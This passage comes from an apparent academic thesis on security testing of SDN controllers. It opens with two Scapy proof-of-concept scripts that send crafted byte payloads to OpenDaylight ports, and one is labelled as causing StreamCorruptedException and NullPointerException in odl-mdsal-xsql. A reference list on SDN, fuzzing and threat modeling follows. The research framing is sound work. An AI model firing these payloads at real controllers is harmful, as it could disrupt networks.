IP_ADDRESS = " 1 2 7 . 0 . 0 . 1 "
PORT = 34343

i f __name__ == ’__main__ ’ :

f o r

i

i n r a n g e ( 0 , 1 0 0 0 ) :

s o c k = s o c k e t . s o c k e t ( )
s o c k . c o n n e c t ( (IP_ADDRESS, PORT) )
stream = StreamSocket ( s o c k )
payload = " \ x30 \ x0a \ x33 \ x32 \ x37 \ x36 \ x39 \ x0a "
stream . send ( payload )
stream . c l o s e ( )

Vulnerability 4: StreamCorruptedException and NullPointerException

in OpenDaylight odl-mdsal-xsql

from scapy . a l l
import ∗
IP_ADDRESS = " 1 2 7 . 0 . 0 . 1 "
PORT = 40004

i f __name__ == ’__main__ ’ :

s o c k = s o c k e t . s o c k e t ( )
s o c k . c o n n e c t ( (IP_ADDRESS, PORT) )
stream = StreamSocket ( s o c k )
payload = " \ x00 \ x00 \ x00 \ x71 \ x6a \ x81 \ x6e \ x30 \ x81 \ x6b \ xa1 " \
" \ x03 \ x02 \ x01 \ x05 \ xa2 \ x03 \ x02 \ x01 \ x0a \ xa4 \ x81 " \
" \ x5e \ x30 \ x5c \ xa0 \ x07 \ x03 \ x05 \ x00 \ x50 \ x80 \ x00 " \
" \ x10 \ xa2 \ x04 \ x1b \ x02 \ x4e \ x4d \ xa3 \ x17 \ x30 \ x15 " \
" \ xa0 \ x03 \ x02 \ x01 \ x00 \ xa1 \ x0e \ x30 \ x0c \ x1b \ x06 " \
" \ x6b \ x72 \ x62 \ x74 \ x67 \ x74 \ x1b \ x02 \ x4e \ x4d \ xa5 " \
" \ x11 \ x18 \ x 0 f \ x31 \ x39 \ x37 \ x30 \ x30 \ x31 \ x30 \ x31 " \
" \ x30 \ x30 \ x30 \ x30 \ x30 \ x30 \ x5a \ xa7 \ x06 \ x02 \ x04 " \
" \ x 1 f \ x1e \ xb9 \ xd9 \ xa8 \ x17 \ x30 \ x15 \ x02 \ x01 \ x12 " \
" \ x02 \ x01 \ x11 \ x02 \ x01 \ x10 \ x02 \ x01 \ x17 \ x02 \ x01 " \
" \ x01 \ x02 \ x01 \ x03 \ x02 \ x01 \ x02 "

stream . send ( payload )
stream . c l o s e ( )

58

References

[1] Nick McKeown, Tom Anderson, Hari Balakrishnan, Guru Parulkar, Larry Peter-
son, Jennifer Rexford, Scott Shenker, and Jonathan Turner. OpenFlow: enabling
innovation in campus networks. ACM SIGCOMM Computer Communication
Review, 38(2):69–74, 2008.

[2] Adrian Lara, Anisha Kolasani, and Byrav Ramamurthy. Network innovation
using OpenFlow: A survey. Communications Surveys & Tutorials, IEEE,
16(1):493–512, 2014.

[3] Fei Hu. Network Innovation through OpenFlow and SDN: Principles and Design.

CRC Press, 2014.

[4] Keith Kirkpatrick. Software-deﬁned networking. Communications of the ACM,

56(9):16–19, 2013.

[5] Diego Kreutz, Fernando MV Ramos, P Esteves Verissimo, C Esteve Rothen-
berg, Siamak Azodolmolky, and Steve Uhlig. Software-deﬁned networking: A
comprehensive survey. Proceedings of the IEEE, 103(1):14–76, 2015.

[6] Open Networking Fundation. Software-deﬁned networking: The new norm for

networks. ONF White Paper, 2012.

[7] Paul Goransson and Chuck Black. Software Deﬁned Networks: A Comprehensive

Approach. Elsevier, 2014.

[8] OpenFlow Switch Speciﬁcation. V1.3.4, 2014.

[9] Diego Kreutz, Fernando Ramos, and Paulo Verissimo. Towards secure and
In Proceedings of the second ACM
dependable software-deﬁned networks.
SIGCOMM workshop on Hot topics in software deﬁned networking, pages 55–60.
ACM, 2013.

[10] Sandra Scott-Hayward, Gemma O’Callaghan, and Sakir Sezer. SDN security:
A survey. In Future Networks and Services (SDN4FNS), 2013 IEEE SDN For,
pages 1–7. IEEE, 2013.

[11] Rowan Kloti, Vasileios Kotronis, and Paul Smith. OpenFlow: A security analysis.
In Network Protocols (ICNP), 2013 21st IEEE International Conference on,
pages 1–6. IEEE, 2013.

[12] Practical security analysis of OpenFlow.

https://www.os3.nl/_media/

2013-2014/courses/ssn/projects/practical_security_analysis_of_
openflow_report.pdf. Accessed: 2016-05-08.

[13] Natasha Gude, Teemu Koponen, Justin Pettit, Ben Pfaﬀ, Martín Casado, Nick
McKeown, and Scott Shenker. NOX: towards an operating system for networks.
ACM SIGCOMM Computer Communication Review, 38(3):105–110, 2008.

59

[14] Pankaj Berde, Matteo Gerola, Jonathan Hart, Yuta Higuchi, Masayoshi
Kobayashi, Toshio Koide, Bob Lantz, Brian O’Connor, Pavlin Radoslavov,
William Snow, et al. ONOS: towards an open, distributed SDN OS.
In
Proceedings of the third workshop on Hot topics in software deﬁned networking,
pages 1–6. ACM, 2014.

[15] OpenDaylight user guide.

https://www.opendaylight.org/sites/

opendaylight/files/bk-user-guide.pdf. Accessed: 2016-05-03.

[16] OpenDaylight Beryllium platform overview. https://www.opendaylight.org/

platform-overview-beryllium. Accessed: 2016-05-03.

[17] OpenDaylight release archives. https://www.opendaylight.org/software/

release-archives. Accessed: 2016-05-03.

[18] ONOS white paper. http://onosproject.org/wp-content/uploads/2014/

11/Whitepaper-ONOS-final.pdf. Accessed: 2016-05-03.

[19] William Stallings. Network security essentials: applications and standards.

Pearson Education India, 2007.

[20] John Wack, Miles Tracy, and Murugiah Souppaya. Guideline on network security

testing. NIST special publication, 800:42, 2003.

[21] Ben Potter and Gary McGraw. Software security testing. Security & Privacy,

IEEE, 2(5):81–85, 2004.

[22] Gary McGraw. Software security: building security in, volume 1. Addison-

Wesley Professional, 2006.

[23] Patrice Godefroid, Michael Y Levin, and David Molnar. SAGE: whitebox

fuzzing for security testing. Queue, 10(1):20, 2012.

[24] Michael Sutton, Adam Greene, and Pedram Amini. Fuzzing: brute force

vulnerability discovery. Pearson Education, 2007.

[25] Scapy. http://www.secdev.org/projects/scapy/. Accessed: 2016-05-08.

[26] Dave Aitel. The advantages of block-based protocol analysis for security testing.

Immunity Inc., February, 105:106, 2002.

[27] Radamsa. https://www.ee.oulu.fi/research/ouspg/Radamsa. Accessed:

2016-05-07.

[28] Fuzzing with Radamsa and some thoughts about coverage. http://www.cs.tut.
fi/tapahtumat/testaus12/kalvot/Wieser_20120606radamsa-coverage.
pdf. Accessed: 2016-05-07.

[29] Adam Shostack. Threat modeling: Designing for security. John Wiley & Sons,

2014.

60

[30] Suvda Myagmar, Adam J Lee, and William Yurcik. Threat modeling as a
basis for security requirements. In Symposium on requirements engineering for
information security (SREIS), volume 2005, pages 1–8, 2005.

[31] Frank Swiderski and Window Snyder. Threat modeling. Microsoft Press, 2004.

[32] IANA OpenFlow port.

http://www.iana.org/assignments/

service-names-port-numbers/service-names-port-numbers.xhtml?
search=openflow. Accessed: 2016-05-16.

[33] OpenFlow Switch Speciﬁcation. Version 1.0.0 (wire protocol 0x01), 2009.

[34] CAPEC Mitre. https://capec.mitre.org/index.html. Accessed: 2016-04-

29.

[35] CAPEC Mitre domains.

https://capec.mitre.org/data/definitions/

3000.html. Accessed: 2016-05-02.

[36] Jeﬀrey A Ingalsbe, Louis Kunimatsu, Tim Baeten, and Nancy R Mead. Threat
modeling: diving into the deep end. Software, IEEE, 25(1):28–34, 2008.

[37] Thomas R Peltier. Information security risk analysis. CRC press, 2005.

[38] Michael Howard and Steve Lipner. The security development lifecycle. O’Reilly

Media, Incorporated, 2009.

[39] OpenDaylight security advisories. https://wiki.opendaylight.org/view/

Security_Advisories. Accessed: 2016-05-23.

[40] ONOS security advisories. https://wiki.onosproject.org/display/ONOS/

Security+advisories. Accessed: 2016-05-23.

[41] OpenDaylight vulnerability management. https://wiki.opendaylight.org/

view/TSC:Vulnerability_Management. Accessed: 2016-05-23.

[42] Codenomicon Defensics.

http://www.codenomicon.com/products/

defensics/. Accessed: 2016-05-09.

[43] Serge Gorbunov and Arnold Rosenbloom. Autofuzz: Automated network

protocol fuzzing framework. IJCSNS, 10(8):239, 2010.

[44] Peach Fuzzer. http://www.peachfuzzer.com/. Accessed: 2016-05-09.

[45] Greg Banks, Marco Cova, Viktoria Felmetsger, Kevin Almeroth, Richard Kem-
merer, and Giovanni Vigna. SNOOZE: toward a Stateful NetwOrk prOtocol
fuzZEr . In Information Security, pages 343–358. Springer, 2006.

[46] ProxyFuzz. https://www.secforce.com/research/tools.html. Accessed:

2016-05-07.

61

[47] What is fuzzing? a white paper by Codenomicon. http://www.codenomicon.

com/files/pdf/WhatisFuzzing.pdf. Accessed: 2016-05-09.

[48] Bugzilla writing guidelines. https://developer.mozilla.org/en-US/docs/

Mozilla/QA/Bug_writing_guidelines. Accessed: 2016-06-28.

[49] Glenford J Myers, Corey Sandler, and Tom Badgett. The art of software testing.

John Wiley & Sons, 2011.

[50] Michael W Whalen, Ajitha Rajan, Mats PE Heimdahl, and Steven P Miller.
Coverage metrics for requirements-based testing. In Proceedings of the 2006
international symposium on Software testing and analysis, pages 25–36. ACM,
2006.


